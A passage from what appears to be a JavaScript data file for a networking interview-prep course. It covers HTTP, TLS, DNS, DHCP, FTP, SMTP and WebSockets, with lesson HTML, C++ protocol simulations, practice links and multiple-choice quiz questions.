            ['Difference Between TCP and UDP', 'https://www.geeksforgeeks.org/differences-between-tcp-and-udp/', 'Easy'],
            ['TCP Tahoe vs Reno Numericals', 'https://www.geeksforgeeks.org/tcp-tahoe-and-tcp-reno/', 'Hard'],
          ],
          mcqs: [
            {q: 'In TCP Reno, when 3 duplicate ACKs are received, the congestion window (cwnd) is set to:', o: ['1 MSS (Slow Start)', 'ssthresh (Fast Recovery)', 'cwnd / 2', 'Unchanged'], a: 1},
            {q: 'The UDP header size is:', o: ['20 bytes', '8 bytes', '12 bytes', '16 bytes'], a: 1},
            {q: 'TCP\'s AIMD stands for:', o: ['Adaptive Increase, Moderate Decrease', 'Additive Increase, Multiplicative Decrease', 'Aggressive Increase, Minimal Decrease', 'Automatic Increase, Manual Decrease'], a: 1},
          ],
        },
      ]
    },

    // ==================== TAB 5: Application Layer ====================
    {
      id: 'app', t: 'Application Layer',
      topics: [
        {
          t: 'HTTP/HTTPS & DNS',
          learn: '<div class="learn-section"><div class="learn-h">HTTP (HyperText Transfer Protocol)</div><p class="learn-p"><b>HTTP</b> is the foundation of data communication on the World Wide Web. It is a <b>request-response</b> protocol operating at the Application Layer, using <b>TCP port 80</b> (or 443 for HTTPS). HTTP is <b>stateless</b> — each request is independent; the server does not retain information about previous requests (cookies and sessions add statefulness on top).</p></div><div class="learn-section"><div class="learn-h">HTTP Methods</div><table class="learn-table"><tr><th>Method</th><th>Purpose</th><th>Idempotent?</th><th>Safe?</th><th>Body?</th></tr><tr><td>GET</td><td>Retrieve resource</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>POST</td><td>Submit data / create resource</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>PUT</td><td>Replace resource entirely</td><td>Yes</td><td>No</td><td>Yes</td></tr><tr><td>PATCH</td><td>Partial update</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>DELETE</td><td>Remove resource</td><td>Yes</td><td>No</td><td>Optional</td></tr><tr><td>HEAD</td><td>GET without body (headers only)</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>OPTIONS</td><td>Supported methods (CORS preflight)</td><td>Yes</td><td>Yes</td><td>No</td></tr></table><p class="learn-p"><b>Idempotent:</b> Making the same request multiple times has the same effect as making it once. <b>Safe:</b> The request does not modify the resource.</p></div><div class="learn-section"><div class="learn-h">HTTP Status Codes</div><table class="learn-table"><tr><th>Range</th><th>Category</th><th>Common Codes</th></tr><tr><td>1xx</td><td>Informational</td><td>100 Continue, 101 Switching Protocols</td></tr><tr><td>2xx</td><td>Success</td><td>200 OK, 201 Created, 204 No Content</td></tr><tr><td>3xx</td><td>Redirection</td><td>301 Moved Permanently, 302 Found, 304 Not Modified</td></tr><tr><td>4xx</td><td>Client Error</td><td>400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests</td></tr><tr><td>5xx</td><td>Server Error</td><td>500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable</td></tr></table></div><div class="learn-section"><div class="learn-h">HTTP Versions</div><p class="learn-p"><b>HTTP/1.0:</b> One request per TCP connection. Connection closed after each response. Very inefficient.</p><p class="learn-p"><b>HTTP/1.1:</b> <b>Persistent connections</b> (keep-alive by default). <b>Pipelining</b> (send multiple requests without waiting, but responses must be in order — causes head-of-line blocking). <b>Chunked transfer encoding</b>, <b>Host header</b> (virtual hosting).</p><p class="learn-p"><b>HTTP/2:</b> <b>Binary framing</b> (not text-based). <b>Multiplexing</b> (multiple streams over one TCP connection — no HOL blocking at HTTP level). <b>Header compression</b> (HPACK). <b>Server push</b>. <b>Stream prioritization</b>.</p><p class="learn-p"><b>HTTP/3:</b> Uses <b>QUIC</b> (over UDP instead of TCP). Eliminates TCP-level head-of-line blocking. Built-in TLS 1.3. Faster connection establishment (0-RTT). Still relatively new but growing adoption.</p><div class="learn-code">HTTP/1.1 Request:\nGET /index.html HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\nConnection: keep-alive\n\nHTTP/1.1 Response:\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nContent-Length: 1234\nDate: Mon, 15 Jun 2026 10:00:00 GMT\n\n&lt;html&gt;...&lt;/html&gt;</div></div><div class="learn-section"><div class="learn-h">HTTPS and TLS</div><p class="learn-p"><b>HTTPS</b> is HTTP over <b>TLS (Transport Layer Security)</b>. It provides: <b>Encryption</b> (confidentiality), <b>Authentication</b> (server identity via certificates), and <b>Integrity</b> (data not tampered).</p><p class="learn-p"><b>TLS 1.2 Handshake:</b></p><ol class="learn-list"><li><b>ClientHello:</b> Client sends supported cipher suites, TLS version, random number.</li><li><b>ServerHello:</b> Server chooses cipher suite, sends its certificate (public key).</li><li><b>Key Exchange:</b> Client generates pre-master secret, encrypts with server\'s public key, sends it.</li><li><b>Both derive session keys</b> from the pre-master secret + random numbers.</li><li><b>Finished:</b> Both send encrypted "finished" messages to verify the handshake.</li></ol><p class="learn-p"><b>TLS 1.3:</b> Faster handshake (1-RTT instead of 2-RTT). Supports 0-RTT resumption. Removed insecure algorithms (RSA key exchange, CBC). Uses only AEAD ciphers.</p><div class="learn-tip"><b>Tip:</b> In interviews, know the difference between <b>symmetric</b> and <b>asymmetric</b> encryption. TLS uses asymmetric (RSA/ECDHE) for key exchange, then symmetric (AES) for bulk data encryption. Asymmetric is slow but solves the key distribution problem.</div></div><div class="learn-section"><div class="learn-h">DNS (Domain Name System)</div><p class="learn-p"><b>DNS</b> translates <b>domain names</b> (e.g., www.google.com) to <b>IP addresses</b> (e.g., 142.250.80.4). It is a <b>hierarchical, distributed</b> database system. DNS uses <b>UDP port 53</b> for queries (TCP for zone transfers and responses &gt; 512 bytes).</p></div><div class="learn-section"><div class="learn-h">DNS Hierarchy</div><div class="learn-code">Root Servers (.)               &larr; 13 root server clusters (a-m)\n   |\n   +-- TLD Servers (.com, .org, .net, .edu, .io, country codes)\n         |\n         +-- Authoritative Name Servers (google.com, example.com)\n               |\n               +-- Actual DNS records (A, AAAA, CNAME, MX, NS, etc.)</div><p class="learn-p"><b>DNS Record Types:</b></p><table class="learn-table"><tr><th>Type</th><th>Purpose</th><th>Example</th></tr><tr><td>A</td><td>Domain &rarr; IPv4</td><td>example.com &rarr; 93.184.216.34</td></tr><tr><td>AAAA</td><td>Domain &rarr; IPv6</td><td>example.com &rarr; 2606:2800:220:1:...</td></tr><tr><td>CNAME</td><td>Alias to another domain</td><td>www.example.com &rarr; example.com</td></tr><tr><td>MX</td><td>Mail server</td><td>example.com &rarr; mail.example.com (priority 10)</td></tr><tr><td>NS</td><td>Authoritative name server</td><td>example.com &rarr; ns1.example.com</td></tr><tr><td>TXT</td><td>Text record (SPF, DKIM, etc.)</td><td>example.com &rarr; "v=spf1 ..."</td></tr><tr><td>PTR</td><td>Reverse lookup (IP &rarr; Domain)</td><td>34.216.184.93 &rarr; example.com</td></tr><tr><td>SOA</td><td>Start of Authority (zone info)</td><td>Serial number, refresh interval, etc.</td></tr></table></div><div class="learn-section"><div class="learn-h">DNS Resolution Process</div><p class="learn-p">When you type <code>www.google.com</code> in a browser:</p><ol class="learn-list"><li><b>Browser cache:</b> Check if the domain was recently resolved.</li><li><b>OS cache:</b> Check the operating system\'s DNS cache.</li><li><b>Recursive resolver:</b> Query the ISP\'s (or configured, e.g., 8.8.8.8) recursive DNS resolver.</li><li><b>Root server:</b> Resolver queries a root server, which returns the TLD server for .com.</li><li><b>TLD server:</b> Returns the authoritative name server for google.com.</li><li><b>Authoritative server:</b> Returns the A record (IP address) for www.google.com.</li><li>Result is <b>cached</b> at each level with a <b>TTL (Time To Live)</b>.</li></ol><div class="learn-code">DNS Query Types:\n- Recursive: "Give me the final answer" (client to resolver)\n- Iterative: "Here\'s the next server to ask" (resolver to servers)\n\nTypical flow:\nClient --(recursive)--> Resolver\nResolver --(iterative)--> Root Server\nResolver --(iterative)--> TLD Server\nResolver --(iterative)--> Authoritative Server\nResolver --(answer)--> Client</div><div class="learn-warn"><b>Warning:</b> DNS queries are <b>unencrypted by default</b> (plaintext UDP). Anyone on the network can see which domains you are resolving. <b>DNS over HTTPS (DoH)</b> and <b>DNS over TLS (DoT)</b> encrypt DNS queries for privacy.</div></div><div class="learn-section"><div class="learn-h">What Happens When You Type a URL in the Browser?</div><p class="learn-p">This is one of the most popular interview questions. The complete answer involves:</p><ol class="learn-list"><li><b>URL parsing:</b> Browser parses protocol, domain, port, path.</li><li><b>DNS resolution:</b> Domain name resolved to IP address (as described above).</li><li><b>TCP connection:</b> 3-way handshake with the server.</li><li><b>TLS handshake:</b> If HTTPS, negotiate encryption parameters.</li><li><b>HTTP request:</b> Browser sends GET request with headers.</li><li><b>Server processing:</b> Server processes request, generates response.</li><li><b>HTTP response:</b> Server sends back status code, headers, and body (HTML).</li><li><b>Browser rendering:</b> Parse HTML, build DOM, load CSS/JS, render page.</li><li><b>Connection management:</b> Keep-alive for subsequent requests or close.</li></ol></div>',
          code: `// === HTTP Client & DNS Resolver Simulation in C++ ===
// Using POSIX sockets for a basic HTTP GET and DNS concepts
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <map>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
using namespace std;

// ---- Simple HTTP GET Request using raw sockets ----
string httpGet(const string& host, const string& path, int port = 80) {
    // Step 1: Resolve hostname to IP
    struct hostent* server = gethostbyname(host.c_str());
    if (!server) {
        return "ERROR: DNS resolution failed for " + host;
    }

    // Step 2: Create TCP socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return "ERROR: Cannot create socket";

    // Step 3: Connect to server
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    memcpy(&serverAddr.sin_addr.s_addr, server->h_addr, server->h_length);

    if (connect(sockfd, (struct sockaddr*)&serverAddr,
                sizeof(serverAddr)) < 0) {
        close(sockfd);
        return "ERROR: Connection failed";
    }

    // Step 4: Send HTTP GET request
    string request = "GET " + path + " HTTP/1.1\\r\\n"
                     "Host: " + host + "\\r\\n"
                     "Connection: close\\r\\n"
                     "User-Agent: SimpleClient/1.0\\r\\n"
                     "\\r\\n";
    send(sockfd, request.c_str(), request.size(), 0);

    // Step 5: Receive response
    string response;
    char buffer[4096];
    int bytesRead;
    while ((bytesRead = recv(sockfd, buffer, sizeof(buffer)-1, 0)) > 0) {
        buffer[bytesRead] = '\\0';
        response += buffer;
    }

    close(sockfd);
    return response;
}

// ---- DNS Cache Simulation ----
struct DNSRecord {
    string domain;
    string ip;
    string type; // A, AAAA, CNAME, MX
    int ttl;     // seconds
};

class DNSCache {
    map<string, DNSRecord> cache;
public:
    void addRecord(const string& domain, const string& ip,
                   const string& type, int ttl) {
        cache[domain] = {domain, ip, type, ttl};
    }

    string resolve(const string& domain) {
        if (cache.find(domain) != cache.end()) {
            cout << "  [Cache HIT] " << domain << " -> "
                 << cache[domain].ip << endl;
            return cache[domain].ip;
        }
        cout << "  [Cache MISS] " << domain << endl;
        return "";
    }

    void display() {
        cout << "\\n=== DNS Cache ===" << endl;
        cout << "Domain\\t\\t\\tType\\tIP\\t\\t\\tTTL" << endl;
        for (auto& [key, rec] : cache) {
            cout << rec.domain << "\\t" << rec.type << "\\t"
                 << rec.ip << "\\t\\t" << rec.ttl << "s" << endl;
        }
    }
};

// ---- DNS Resolution Simulation (iterative) ----
void simulateDNSResolution(const string& domain) {
    cout << "\\n=== Simulating DNS Resolution for " << domain
         << " ===" << endl;

    // Parse domain parts
    vector<string> parts;
    stringstream ss(domain);
    string part;
    while (getline(ss, part, '.')) parts.push_back(part);

    cout << "1. Check browser cache... MISS" << endl;
    cout << "2. Check OS cache (/etc/hosts)... MISS" << endl;
    cout << "3. Query recursive resolver (8.8.8.8)..." << endl;
    cout << "4. Resolver queries Root Server (.)" << endl;
    cout << "   Root: 'Try .com TLD at 192.5.6.30'" << endl;
    cout << "5. Resolver queries .com TLD Server" << endl;
    cout << "   TLD: 'Try " << parts[parts.size()-2] << ".com NS at 216.239.32.10'" << endl;
    cout << "6. Resolver queries Authoritative Server for "
         << domain << endl;
    cout << "   Auth: '" << domain << " A 142.250.80.4 (TTL=300)'" << endl;
    cout << "7. Resolver caches result, returns to client" << endl;
    cout << "8. Result: " << domain << " -> 142.250.80.4" << endl;
}

// ---- HTTP Request/Response Parser ----
void parseHTTPResponse(const string& raw) {
    cout << "\\n=== HTTP Response Parsing ===" << endl;

    // Find status line
    size_t firstLine = raw.find("\\r\\n");
    if (firstLine == string::npos) firstLine = raw.find("\\n");
    string statusLine = raw.substr(0, firstLine);
    cout << "Status Line: " << statusLine << endl;

    // Parse headers
    size_t headerEnd = raw.find("\\r\\n\\r\\n");
    if (headerEnd == string::npos) headerEnd = raw.find("\\n\\n");
    string headers = raw.substr(firstLine + 2, headerEnd - firstLine - 2);
    cout << "Headers:" << endl;

    stringstream hs(headers);
    string line;
    while (getline(hs, line)) {
        if (!line.empty() && line[0] != '\\r')
            cout << "  " << line << endl;
    }

    cout << "Body length: " << (raw.size() - headerEnd - 4) << " bytes" << endl;
}

// ---- URL Parser ----
void parseURL(const string& url) {
    cout << "\\n=== URL Parsing ===" << endl;
    cout << "URL: " << url << endl;

    // Protocol
    size_t protoEnd = url.find("://");
    string protocol = (protoEnd != string::npos) ?
                       url.substr(0, protoEnd) : "http";
    cout << "Protocol: " << protocol << endl;

    // Host + path
    size_t hostStart = (protoEnd != string::npos) ? protoEnd + 3 : 0;
    size_t pathStart = url.find('/', hostStart);
    string host = (pathStart != string::npos) ?
                   url.substr(hostStart, pathStart - hostStart) :
                   url.substr(hostStart);
    string path = (pathStart != string::npos) ? url.substr(pathStart) : "/";

    // Port
    size_t portPos = host.find(':');
    int port = (protocol == "https") ? 443 : 80;
    if (portPos != string::npos) {
        port = stoi(host.substr(portPos + 1));
        host = host.substr(0, portPos);
    }

    cout << "Host: " << host << endl;
    cout << "Port: " << port << endl;
    cout << "Path: " << path << endl;
}

int main() {
    // DNS Cache demo
    DNSCache cache;
    cache.addRecord("www.google.com", "142.250.80.4", "A", 300);
    cache.addRecord("www.example.com", "93.184.216.34", "A", 3600);
    cache.addRecord("mail.google.com", "142.250.80.5", "A", 300);
    cache.display();

    cout << "\\nResolving domains:" << endl;
    cache.resolve("www.google.com");  // HIT
    cache.resolve("www.github.com");  // MISS

    // DNS resolution simulation
    simulateDNSResolution("www.google.com");

    // URL parsing
    parseURL("https://www.example.com:8080/api/v1/users?page=1");
    parseURL("http://localhost/index.html");

    return 0;
}`,
          problems: [
            ['DNS Lookup Concepts', 'https://www.geeksforgeeks.org/dns-domain-name-server/', 'Easy'],
            ['HTTP Methods Practice', 'https://www.geeksforgeeks.org/http-request-methods/', 'Easy'],
            ['Design Tiny URL (LeetCode 535)', 'https://leetcode.com/problems/encode-and-decode-tinyurl/', 'Medium'],
            ['Web Crawler (LeetCode 1236)', 'https://leetcode.com/problems/web-crawler/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which HTTP method is NOT idempotent?', o: ['GET', 'PUT', 'DELETE', 'POST'], a: 3},
            {q: 'DNS primarily uses which transport protocol?', o: ['TCP', 'UDP', 'SCTP', 'QUIC'], a: 1},
            {q: 'HTTP/2 introduced which key feature to solve head-of-line blocking?', o: ['Persistent connections', 'Pipelining', 'Multiplexing with binary framing', 'Chunked transfer encoding'], a: 2},
          ],
        },
        {
          t: 'DHCP, FTP, SMTP & WebSockets',
          learn: '<div class="learn-section"><div class="learn-h">DHCP (Dynamic Host Configuration Protocol)</div><p class="learn-p"><b>DHCP</b> automatically assigns IP addresses and other network configuration (subnet mask, default gateway, DNS server) to devices on a network. Without DHCP, every device would need <b>manual IP configuration</b>. DHCP uses <b>UDP ports 67 (server) and 68 (client)</b>.</p><p class="learn-p"><b>DORA Process (DHCP 4-step handshake):</b></p><ol class="learn-list"><li><b>Discover:</b> Client broadcasts a DHCP Discover message to find DHCP servers. (Src: 0.0.0.0, Dst: 255.255.255.255)</li><li><b>Offer:</b> DHCP server responds with an available IP address and configuration offer. (Broadcast or unicast)</li><li><b>Request:</b> Client broadcasts a DHCP Request, accepting the offer (may reach multiple servers; only one offer accepted).</li><li><b>Acknowledge:</b> Server sends DHCP ACK confirming the lease. Client configures its interface.</li></ol><div class="learn-code">DORA Process:\n\nClient                      DHCP Server\n  |-- DHCPDISCOVER (broadcast) --&gt;|\n  |&lt;-- DHCPOFFER (IP=10.0.0.5) ---|  (unicast or broadcast)\n  |-- DHCPREQUEST (for 10.0.0.5) -&gt;| (broadcast)\n  |&lt;-- DHCPACK -------------------|  Lease granted!\n  |\n  | Now client has IP 10.0.0.5\n  | Lease duration: e.g., 24 hours\n  | At 50% lease: try DHCP Renew (unicast to server)\n  | At 87.5% lease: DHCP Rebind (broadcast)</div><div class="learn-tip"><b>Tip:</b> DHCP relay agents (IP helpers) allow DHCP to work across different subnets by forwarding DHCP broadcasts as unicast to the DHCP server on another subnet.</div></div><div class="learn-section"><div class="learn-h">FTP (File Transfer Protocol)</div><p class="learn-p"><b>FTP</b> is used for transferring files between client and server. It uses <b>two separate TCP connections</b>:</p><ul class="learn-list"><li><b>Control connection (port 21):</b> Commands and responses (USER, PASS, LIST, RETR, STOR, etc.). Persistent throughout the session.</li><li><b>Data connection (port 20 or ephemeral):</b> Actual file data transfer. Opened/closed per transfer.</li></ul><p class="learn-p"><b>Active vs Passive Mode:</b></p><table class="learn-table"><tr><th>Feature</th><th>Active Mode</th><th>Passive Mode</th></tr><tr><td>Data connection initiated by</td><td>Server (from port 20)</td><td>Client</td></tr><tr><td>Firewall friendly?</td><td>No (server connects to client)</td><td>Yes (client connects to server)</td></tr><tr><td>Command</td><td>PORT</td><td>PASV</td></tr></table><div class="learn-warn"><b>Warning:</b> FTP transmits credentials <b>in plaintext</b>. Use <b>SFTP</b> (SSH File Transfer Protocol, port 22) or <b>FTPS</b> (FTP over TLS) for secure file transfers. SFTP is NOT FTP over SSH — it is a completely different protocol built into SSH.</div></div><div class="learn-section"><div class="learn-h">SMTP (Simple Mail Transfer Protocol)</div><p class="learn-p"><b>SMTP</b> is used for <b>sending</b> emails. It operates on <b>TCP port 25</b> (or 587 for submission with authentication). SMTP is a <b>push protocol</b> — the sender pushes the email to the receiver\'s mail server.</p><div class="learn-code">SMTP Session Example:\n\nClient: HELO client.example.com\nServer: 250 Hello client.example.com\nClient: MAIL FROM:&lt;alice@example.com&gt;\nServer: 250 OK\nClient: RCPT TO:&lt;bob@another.com&gt;\nServer: 250 OK\nClient: DATA\nServer: 354 Start mail input\nClient: Subject: Hello\nClient: \nClient: Hi Bob, how are you?\nClient: .\nServer: 250 OK, message queued\nClient: QUIT\nServer: 221 Bye</div><p class="learn-p"><b>Email Protocol Stack:</b></p><ul class="learn-list"><li><b>SMTP:</b> Sending emails (client to server, server to server).</li><li><b>POP3 (port 110):</b> Retrieving emails. Downloads and (typically) deletes from server. Simple, not ideal for multi-device.</li><li><b>IMAP (port 143):</b> Retrieving emails. Keeps emails on server, supports folders. Better for multi-device access.</li></ul><div class="learn-code">Email Delivery Path:\n\nAlice (MUA) --SMTP--> Alice\'s Mail Server (MTA)\n                       |\n                  DNS MX lookup for bob\'s domain\n                       |\n                  --SMTP--> Bob\'s Mail Server (MTA)\n                                |\n                           Bob (MUA) --POP3/IMAP--> retrieves email</div></div><div class="learn-section"><div class="learn-h">WebSockets</div><p class="learn-p"><b>WebSockets</b> provide <b>full-duplex, bidirectional</b> communication over a <b>single TCP connection</b>. Unlike HTTP (request-response), WebSockets allow the server to <b>push data to the client</b> without the client requesting it. This is ideal for real-time applications.</p><p class="learn-p"><b>WebSocket Handshake (HTTP Upgrade):</b></p><div class="learn-code">Client Request:\nGET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\n\nServer Response:\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n\n(Now the connection is upgraded from HTTP to WebSocket.\n Both sides can send frames freely.)</div><p class="learn-p"><b>WebSockets vs HTTP Polling vs SSE:</b></p><table class="learn-table"><tr><th>Feature</th><th>HTTP Polling</th><th>Long Polling</th><th>SSE (Server-Sent Events)</th><th>WebSockets</th></tr><tr><td>Direction</td><td>Client &rarr; Server</td><td>Client &rarr; Server</td><td>Server &rarr; Client</td><td>Bidirectional</td></tr><tr><td>Latency</td><td>High (interval)</td><td>Medium</td><td>Low</td><td>Very Low</td></tr><tr><td>Overhead</td><td>High (repeated HTTP)</td><td>Medium</td><td>Low</td><td>Very Low (2-byte frame)</td></tr><tr><td>Protocol</td><td>HTTP</td><td>HTTP</td><td>HTTP</td><td>ws:// or wss://</td></tr><tr><td>Use Case</td><td>Simple status checks</td><td>Chat (old approach)</td><td>News feeds, notifications</td><td>Real-time apps, gaming, trading</td></tr></table></div><div class="learn-section"><div class="learn-h">Other Application Layer Protocols</div><p class="learn-p"><b>Telnet (port 23):</b> Remote terminal access. Plaintext, insecure. Replaced by SSH.</p><p class="learn-p"><b>SSH (port 22):</b> Secure remote shell access. Provides encryption, authentication, and tunneling. Uses public-key or password authentication.</p><p class="learn-p"><b>SNMP (port 161 UDP):</b> Simple Network Management Protocol. Used for monitoring and managing network devices (routers, switches, servers).</p><p class="learn-p"><b>NTP (port 123 UDP):</b> Network Time Protocol. Synchronizes clocks across network devices. Critical for logging, certificates, and distributed systems.</p></div><div class="learn-section"><div class="learn-h">REST vs GraphQL vs gRPC</div><p class="learn-p">Modern APIs use different communication patterns:</p><table class="learn-table"><tr><th>Feature</th><th>REST</th><th>GraphQL</th><th>gRPC</th></tr><tr><td>Protocol</td><td>HTTP/1.1 or HTTP/2</td><td>HTTP</td><td>HTTP/2</td></tr><tr><td>Data Format</td><td>JSON (typically)</td><td>JSON</td><td>Protocol Buffers (binary)</td></tr><tr><td>Schema</td><td>OpenAPI/Swagger</td><td>GraphQL Schema</td><td>.proto files</td></tr><tr><td>Fetching</td><td>Multiple endpoints</td><td>Single endpoint, client specifies fields</td><td>RPC methods</td></tr><tr><td>Over/Under-fetching</td><td>Common problem</td><td>Solved (client controls)</td><td>N/A (defined messages)</td></tr><tr><td>Use Case</td><td>Web APIs, CRUD</td><td>Complex frontends, mobile</td><td>Microservices, low-latency</td></tr></table><div class="learn-tip"><b>Tip:</b> In DE Shaw interviews, understanding REST API design principles (resource-based URLs, proper HTTP methods, status codes, pagination, versioning) is commonly tested alongside system design questions.</div></div>',
          code: `// === Application Layer Protocol Simulations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <ctime>
using namespace std;

// ---- DHCP Server Simulation ----
struct DHCPLease {
    string clientMAC;
    string assignedIP;
    int leaseTime; // seconds
    time_t leaseStart;
};

class DHCPServer {
    string networkPrefix;  // e.g., "192.168.1."
    int nextIP;
    int poolStart, poolEnd;
    string subnetMask, gateway, dnsServer;
    map<string, DHCPLease> leases;

public:
    DHCPServer(string prefix, int start, int end)
        : networkPrefix(prefix), nextIP(start),
          poolStart(start), poolEnd(end) {
        subnetMask = "255.255.255.0";
        gateway = prefix + "1";
        dnsServer = "8.8.8.8";
    }

    // DORA Process
    string handleDiscover(const string& clientMAC) {
        cout << "  DHCPDISCOVER from " << clientMAC << endl;
        string offeredIP = networkPrefix + to_string(nextIP);
        cout << "  DHCPOFFER: " << offeredIP << endl;
        return offeredIP;
    }

    void handleRequest(const string& clientMAC, const string& requestedIP) {
        cout << "  DHCPREQUEST for " << requestedIP
             << " from " << clientMAC << endl;

        DHCPLease lease;
        lease.clientMAC = clientMAC;
        lease.assignedIP = requestedIP;
        lease.leaseTime = 86400; // 24 hours
        lease.leaseStart = time(nullptr);
        leases[clientMAC] = lease;
        nextIP++;

        cout << "  DHCPACK: " << requestedIP << " leased for "
             << lease.leaseTime << "s" << endl;
        cout << "    Subnet Mask: " << subnetMask << endl;
        cout << "    Gateway:     " << gateway << endl;
        cout << "    DNS Server:  " << dnsServer << endl;
    }

    void displayLeases() {
        cout << "\\n  Active Leases:" << endl;
        for (auto& [mac, lease] : leases) {
            cout << "    " << lease.clientMAC << " -> "
                 << lease.assignedIP << " (TTL: "
                 << lease.leaseTime << "s)" << endl;
        }
    }
};

void simulateDHCP() {
    cout << "=== DHCP DORA Simulation ===" << endl;
    DHCPServer server("192.168.1.", 100, 200);

    // Client 1
    string mac1 = "AA:BB:CC:11:22:33";
    string ip1 = server.handleDiscover(mac1);
    server.handleRequest(mac1, ip1);

    // Client 2
    string mac2 = "DD:EE:FF:44:55:66";
    string ip2 = server.handleDiscover(mac2);
    server.handleRequest(mac2, ip2);

    server.displayLeases();
}

// ---- FTP Command Simulation ----
void simulateFTP() {
    cout << "\\n=== FTP Session Simulation ===" << endl;

    struct FTPExchange { string client; string server; };
    vector<FTPExchange> session = {
        {"(Connect to port 21)", "220 Welcome to FTP Server"},
        {"USER admin", "331 Password required"},
        {"PASS secret123", "230 Login successful"},
        {"PWD", "257 \"/home/admin\" is current directory"},
        {"PASV", "227 Entering Passive Mode (192,168,1,1,4,1)"},
        {"LIST", "150 Opening data connection\\n"
                 "drwxr-xr-x  docs/\\n"
                 "-rw-r--r--  readme.txt (1024 bytes)\\n"
                 "226 Transfer complete"},
        {"RETR readme.txt", "150 Opening BINARY mode data connection\\n"
                            "226 Transfer complete (1024 bytes)"},
        {"QUIT", "221 Goodbye"},
    };

    for (auto& ex : session) {
        cout << "  C: " << ex.client << endl;
        cout << "  S: " << ex.server << endl;
    }
}

// ---- SMTP Email Sending Simulation ----
void simulateSMTP() {
    cout << "\\n=== SMTP Session Simulation ===" << endl;

    struct SMTPExchange { string client; string server; };
    vector<SMTPExchange> session = {
        {"(Connect to port 25)", "220 mail.example.com SMTP Ready"},
        {"EHLO client.example.com",
         "250-mail.example.com\\n250-AUTH PLAIN LOGIN\\n250 OK"},
        {"MAIL FROM:<alice@example.com>", "250 OK"},
        {"RCPT TO:<bob@deshaw.com>", "250 OK"},
        {"DATA", "354 Start mail input; end with <CRLF>.<CRLF>"},
        {"From: alice@example.com\\n"
         "To: bob@deshaw.com\\n"
         "Subject: Interview Schedule\\n"
         "Date: Mon, 15 Jun 2026 10:00:00\\n\\n"
         "Hi Bob,\\nYour interview is at 2 PM.\\n.",
         "250 OK, message ID: <abc123@mail.example.com>"},
        {"QUIT", "221 Bye"},
    };

    for (auto& ex : session) {
        cout << "  C: " << ex.client << endl;
        cout << "  S: " << ex.server << endl;
    }
}

// ---- WebSocket Frame Structure ----
void explainWebSocketFrame() {
    cout << "\\n=== WebSocket Frame Format ===" << endl;
    cout << " 0                   1                   2" << endl;
    cout << " 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3" << endl;
    cout << "+-+-+-+-+-------+-+-------------+----------------+" << endl;
    cout << "|F|R|R|R| opcode|M| Payload len |  Extended len  |" << endl;
    cout << "|I|S|S|S| (4)   |A|   (7)       |  (16/64 bits)  |" << endl;
    cout << "|N|V|V|V|       |S|             |                |" << endl;
    cout << "+-+-+-+-+-------+-+-------------+----------------+" << endl;
    cout << "|          Masking key (if MASK=1, 32 bits)       |" << endl;
    cout << "+------------------------------------------------+" << endl;
    cout << "|          Payload Data                           |" << endl;
    cout << "+------------------------------------------------+" << endl;
    cout << "\\nOpcodes:" << endl;
    cout << "  0x0: Continuation  0x1: Text  0x2: Binary" << endl;
    cout << "  0x8: Close  0x9: Ping  0xA: Pong" << endl;
}

// ---- Simple REST API Router Simulation ----
void simulateRESTAPI() {
    cout << "\\n=== REST API Router ===" << endl;

    struct Request { string method; string path; string body; };
    vector<Request> requests = {
        {"GET",    "/api/users",     ""},
        {"POST",   "/api/users",     "{\"name\":\"Alice\"}"},
        {"GET",    "/api/users/1",   ""},
        {"PUT",    "/api/users/1",   "{\"name\":\"Bob\"}"},
        {"DELETE", "/api/users/1",   ""},
    };

    map<string, string> responses = {
        {"GET /api/users",     "200 OK [{\"id\":1,\"name\":\"Alice\"}]"},
        {"POST /api/users",    "201 Created {\"id\":2,\"name\":\"Alice\"}"},
        {"GET /api/users/1",   "200 OK {\"id\":1,\"name\":\"Alice\"}"},
        {"PUT /api/users/1",   "200 OK {\"id\":1,\"name\":\"Bob\"}"},
        {"DELETE /api/users/1","204 No Content"},
    };

    for (auto& req : requests) {
        string key = req.method + " " + req.path;
        cout << "  " << req.method << " " << req.path;
        if (!req.body.empty()) cout << " Body: " << req.body;
        cout << endl;
        cout << "  -> " << responses[key] << endl << endl;
    }
}

int main() {
    simulateDHCP();
    simulateFTP();
    simulateSMTP();
    explainWebSocketFrame();
    simulateRESTAPI();
    return 0;
}`,
          problems: [
            ['DHCP Process Questions', 'https://www.geeksforgeeks.org/dynamic-host-configuration-protocol-dhcp/', 'Easy'],
            ['SMTP Protocol Practice', 'https://www.geeksforgeeks.org/simple-mail-transfer-protocol-smtp/', 'Easy'],
            ['Design a Chat System (WebSocket concepts)', 'https://www.geeksforgeeks.org/design-a-chat-system/', 'Hard'],
          ],
          mcqs: [
            {q: 'The DHCP DORA process stands for:', o: ['Discover, Offer, Request, Acknowledge', 'Download, Open, Read, Accept', 'Detect, Organize, Route, Assign', 'Discover, Open, Receive, Assign'], a: 0},
            {q: 'FTP uses two connections. The control connection is on port:', o: ['20', '21', '22', '25'], a: 1},
